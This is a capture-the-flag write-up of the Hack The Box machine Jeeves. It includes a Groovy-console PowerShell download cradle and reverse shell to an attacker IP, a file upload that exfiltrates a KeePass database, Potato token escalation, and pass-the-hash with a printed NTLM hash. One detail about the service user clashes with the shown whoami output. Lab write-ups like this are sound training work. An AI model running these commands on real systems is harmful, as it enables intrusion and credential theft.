# Jeeves

| Attribute | Value |
|---|---|
| OS | Windows 10 / Server (workgroup, not AD) |
| Difficulty | Medium |
| IP | 10.10.10.63 |
| IppSec video | <https://www.youtube.com/watch?v=EKGBskG8APc> |

## Source
- `[per transcript]` — Jeeves is referenced 31 times for `Jenkins`, 9
  times for `rotten potato`, and 4 times for `Groovy`. The full chain is
  taken from the IppSec video.
- `[per transcript]` — The transcript explicitly mentions: KeePass crack
  → NTLM hash inside → pass-the-hash → administrator → ADS for
  `root.txt:root.txt`.

## TL;DR Attack Chain
Port 80 hosts a friendly "Ask Jeeves" page (rabbit hole). Port 50000 is
Jenkins, unauthenticated. Use the `/script` Groovy console for RCE → run
a PowerShell reverse shell. Inside the box as the Jenkins user, find a
KeePass database `CEH.kdbx` in `C:\Users\kohsuke\Documents`. Crack the
master password with hashcat (`keepass2john` first). Open the database,
find an account with an NTLM hash. Pass-the-hash to authenticate as
administrator. There is no `root.txt` — instead `hm.txt` exists with an
Alternate Data Stream (`hm.txt:root.txt:$DATA`). Read the ADS to get the
flag.

## Initial Enumeration

```bash
sudo nmap -p- --min-rate=10000 -T4 -oA nmap/all-tcp 10.10.10.63
sudo nmap -sV -sC -p 80,135,445,50000 -oA nmap/detail 10.10.10.63
```

Open ports:
- `80/tcp`  HTTP — "Ask Jeeves" search-engine homage page (rabbit hole).
- `135/tcp` Microsoft RPC.
- `445/tcp` SMB.
- `50000/tcp` Jenkins (the foothold).

## Attack Surface Mapping

| Service | Port | Hypothesis |
|---|---|---|
| HTTP | 80 | Static page; rabbit hole; verify |
| SMB | 445 | Anon enumeration |
| Jenkins | 50000 | **Primary foothold** — Jenkins Groovy console = RCE if unauthenticated |

> **IppSec key reasoning**: "Jenkins running unauthenticated is RCE-as-a-
> service. The `/script` endpoint accepts arbitrary Groovy and runs it
> with the Jenkins service-account privileges. That's not a CVE; that's a
> deliberate feature being misconfigured."

## Foothold

### 1. Quickly verify port 80 is the rabbit hole

```bash
curl -s http://10.10.10.63/
# Static "Ask Jeeves" page; no obvious dynamic content.
gobuster dir -u http://10.10.10.63/ -w raft-medium-words.txt
# Dead end (intentionally; some files exist but aren't fruitful)
```

### 2. Jenkins on 50000

```bash
curl -s http://10.10.10.63:50000/
# Jenkins login page; "View as anonymous" works
```

Browse to `http://10.10.10.63:50000/script` — the Groovy console.

### 3. Groovy RCE

In the console:
```groovy
def cmd = "powershell.exe -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.x -Port 4444"
def proc = ["cmd.exe","/c",cmd].execute()
proc.waitFor()
println proc.text
```

Listener:
```bash
# attacker
nc -lvnp 4444
sudo python3 -m http.server 80    # serving Invoke-PowerShellTcp.ps1
```

> **Why not `Runtime.getRuntime().exec(...)`**: Groovy supports it, but
> piping output is awkward. Using a PowerShell reverse-shell directly
> bypasses the awkwardness; the Jenkins worker has PowerShell.

> **Why a download cradle**: Reverse shells via Nishang's
> `Invoke-PowerShellTcp` give you a far more usable shell than raw `nc.
> exe`. Loading from memory avoids on-disk artefacts.

The reverse shell connects as the Jenkins service user (typically
`Jeeves\Administrator` on this box, but limited via context).

### 4. Initial enumeration

```powershell
whoami
# jeeves\kohsuke    # the Jenkins service user

whoami /priv
# SeImpersonatePrivilege  Enabled  ⇒ Potato candidate
```

## Privilege Escalation (Path 1: Token Impersonation — fast)

Although the *intended* path is the KeePass one, IppSec demonstrates
both. The token path is much faster.

```powershell
# Upload RottenPotato (or a JuicyPotato variant; this is pre-2019 Windows)
# Drop in C:\ProgramData\
upload C:\Tools\rottenpotato.exe C:\ProgramData\rp.exe

# Use the Metasploit incognito module to hijack the resulting SYSTEM token
# In an MSF session:
#   load incognito
#   list_tokens -u
#   execute -cH -f rottenpotato.exe
#   impersonate_token "NT AUTHORITY\\SYSTEM"
```

Or with `JuicyPotato.exe` standalone:
```powershell
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\Windows\Temp\who.txt" -t *
type C:\Windows\Temp\who.txt
# nt authority\system
```

## Privilege Escalation (Path 2: Intended — KeePass)

### 5. Discover CEH.kdbx

```powershell
# in PowerShell shell from Jenkins
Get-ChildItem -Path C:\Users -Recurse -Force -Include *.kdbx -ErrorAction SilentlyContinue
# C:\Users\kohsuke\Documents\CEH.kdbx
```

Download to attacker:
```powershell
# evil-winrm style if you have creds; otherwise via SMB share or HTTP
$wc = New-Object Net.WebClient
$wc.UploadFile('http://10.10.14.x/upload','PUT','C:\Users\kohsuke\Documents\CEH.kdbx')
```
Or just write to a writable share served by the attacker via `impacket-smbserver`.

### 6. Crack the KeePass master

```bash
keepass2john CEH.kdbx > kp.hash
hashcat -m 13400 kp.hash /usr/share/wordlists/rockyou.txt
# master: moonshine1
```

### 7. Open and harvest

```bash
kpcli --kdb=CEH.kdbx
> ls
> find <something>
> show -f Backup\ Stuff
```

The Backup entry contains an NTLM hash, not a cleartext password (this
is the IppSec-noted twist):

```
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

### 8. Pass-the-hash to administrator

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63
# SYSTEM shell
```

## Reading root.txt

The administrator desktop has `hm.txt`, not `root.txt`. The `hm.txt`
hosts an Alternate Data Stream containing the flag:

```cmd
:: from the SYSTEM shell
dir /R C:\Users\Administrator\Desktop
# shows hm.txt and:
#   hm.txt:root.txt:$DATA

more < C:\Users\Administrator\Desktop\hm.txt:root.txt
```

> **Why ADS at all**: The box's author wants to teach NTFS Alternate Data
> Streams. ADS is forensically meaningful and frequently used by malware
> to hide payloads inside otherwise-ordinary files. `dir /R` is the
> only built-in command that lists them.

## Key Findings

- Unauthenticated Jenkins ⇒ Groovy console = RCE. Always check
  `:50000/script`.
- KeePass databases on disk are *invitations to crack*. Standard mode is
  13400.
- KeePass entries can store NTLM hashes; pass-the-hash even with the
  master password gives no cleartext.
- ADS (`dir /R`) is mandatory on Windows post-exploit.
- Token privileges (`SeImpersonate`) on a Jenkins / IIS / MSSQL service
  account are an immediate Potato escalation.

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Service discovery |
| `gobuster` | Confirm 80 is rabbit hole |
| Browser → Groovy console | Initial RCE |
| `Invoke-PowerShellTcp.ps1` (Nishang) | Reverse shell payload |
| `RottenPotato` / `JuicyPotato` / `Incognito` | Token impersonation |
| `keepass2john` | KeePass hash extraction |
| `hashcat -m 13400` | Crack master |
| `kpcli` | Open KeePass database |
| `impacket-psexec` | Pass-the-hash |
| `dir /R` | ADS discovery |

## Decision Tree

```
nmap → 80 / 50000
  ├─ 80 → static page, rabbit hole
  └─ 50000 → Jenkins, anon
       └─ /script Groovy → PowerShell reverse shell
            └─ shell as kohsuke (SeImpersonate)
                 ├─ Path A (token):
                 │    RottenPotato/Incognito → SYSTEM
                 └─ Path B (intended):
                      Get-ChildItem *.kdbx → CEH.kdbx
                       └─ keepass2john → hashcat -m 13400 → 'moonshine1'
                            └─ kpcli → backup entry has NTLM hash (not text)
                                 └─ psexec -hashes administrator
                                      └─ dir /R Administrator's desktop → hm.txt:root.txt
                                           └─ more < hm.txt:root.txt
```

## Alternative Approaches

- Use Metasploit's `exploit/multi/http/jenkins_script_console` for the
  initial RCE (handler + reverse_tcp meterpreter handed to you).
- Use `kpwalk` (Python) to dump KeePass without `kpcli`.
- Use `evil-winrm` instead of psexec for the post-PtH shell (Jeeves
  doesn't have WinRM enabled, so psexec it is).
- Use `RoguePotato`/`PrintSpoofer`/`GodPotato` on newer Windows where
  RottenPotato/JuicyPotato are patched.

## Lessons Learned

1. Jenkins on a non-standard port is still Jenkins; always check
   `:50000`, `:8080`, `:8081`, `:8443` for it.
2. `SeImpersonatePrivilege` ⇒ Potato. Memorise the privilege list:
   *SeImpersonate, SeAssignPrimaryToken, SeTcb, SeBackup, SeRestore,
   SeCreateToken, SeLoadDriver, SeTakeOwnership, SeDebug.* Each unlocks
   a privesc primitive.
3. Pass-the-hash ≠ cracking. If you see an NTLM hash, *try it as a
   cred first*; never spend time cracking what you can pass.
4. ADS in Windows post-ex is a hidden-file class of artefact; `dir /R`
   is non-default behaviour and you must remember it.
5. Always test the obvious-looking page (port 80) for exactly the time
   it takes to confirm it's a rabbit hole, then move on.

## Extracted Skills

- [`web/jenkins-groovy-rce.md`](../web/jenkins-groovy-rce.md)
- [`windows-privesc/token-impersonation.md`](../windows-privesc/token-impersonation.md)
- [`password-attacks/keepass-cracking.md`](../password-attacks/keepass-cracking.md)
- [`windows-privesc/alternate-data-streams.md`](../windows-privesc/alternate-data-streams.md)
- [`tool-usage/impacket.md`](../tool-usage/impacket.md)
- [`tool-usage/nishang.md`](../tool-usage/nishang.md)
- [`tool-usage/hashcat.md`](../tool-usage/hashcat.md)

## Related Techniques (other machines)

- **Bastard** — Drupal RCE → SeImpersonate → Potato (same privesc
  class).
- **Bounty** — IIS web.config bypass → SeImpersonate → potato.
- **Optimum** — Windows non-AD with kernel exploit privesc (different
  class).
- **Devel, Granny, Grandpa** — IIS WebDAV foothold + SeImpersonate.
- **SecNotes, Conceal, Querier** — different KeePass / token combinations.
